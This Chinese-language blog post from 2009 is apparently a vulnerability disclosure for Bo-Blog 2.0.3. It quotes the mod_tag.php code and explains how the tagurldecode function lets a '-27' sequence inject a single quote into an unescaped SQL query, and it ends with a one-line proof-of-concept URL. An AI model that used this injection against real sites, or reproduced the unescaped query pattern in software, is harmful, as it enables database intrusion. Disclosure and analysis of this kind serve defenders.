---
title: Bo-Blog 2.0.3 注入漏洞
description: Bo-Blog2.0.3注入漏洞//inc/mod_tag.php------------------------……
date: 2009-05-09 10:04:44
category: 漏洞信息
tags: ['Bo-Blog', '注入', '漏洞信息', 'PoC']
post_id: 858
alias: Bo-Blog-2.0.3-SQLInjection
ViewNums: 2897
---

[Bo-Blog 2.0.3 注入漏洞](/blog/bo-blog-203-sqlinjection)

//inc/mod_tag.php

------------------------

if (!defined('VALIDREQUEST')) die ('Access Denied.');

if (!$job) $job='default';
else $job=basename($job);
$itemid=safe_convert($itemid);

acceptrequest('tag,rewrite');
if ($tag!=='') $job='show';
$tag=($config['smarturl']==1 && $config['urlrewrite']==1 && $rewrite==1) ? tagurldecode($tag) : $tag;
//缺省情况$config['smarturl']==1 && $config['urlrewrite']==1 这个条件是不成立的，所以不会调用tagurldecode函数
//要管理员使用urlrewite功能才可以

if ($job=='default') {
..........
}

if ($job=='show') {
    acceptrequest('mode');
    if ($mode==1 || $mode==2) $mbcon['tag_list']=$mode-1;

    $m_b=new getblogs;
    if ($tag==='') catcherror($lnc[192]);

    //$tag 变量进入查询语句，但是需要一个单引号，我们恰好可以通过tagurldecode函数引入单引号
    $allentries=$blog->getgroupbyquery("SELECT * FROM `{$db_prefix}tags` WHERE `tagname`='{$tag}' LIMIT 0,1");
    if (!is_array($allentries[0]) || $allentries[0]['tagentry']=='<end>' || $allentries[0]['tagcounter']==0) {

----------------------------

$tag 变量进入查询语句是被单引号包围的，但是我们恰好可以通过tagurldecode函数引入单引号，看代码

function tagurlencode($str) {//编码函数
    $str=urlencode($str);
    $str=str_replace('-', '--', $str);
    $str=str_replace('%', '-', $str);
    return $str;
}
function tagurldecode($str) { //解码函数
    $str=str_replace('-', '%', $str);
    $str=str_replace('%%', '-', $str);
    $str=urldecode($str);
    return $str;
}

这样我们就可以利用[这个漏洞](/blog/bo-blog-203-sqlinjection)

--------------------
PoC:
index.php?act=tag&job=show&rewrite=1&tag=aaaa-27
--------------------

BY: [Flyh4t](http://bbs.wolvez.org/topic/77/)
<http://bbs.wolvez.org>

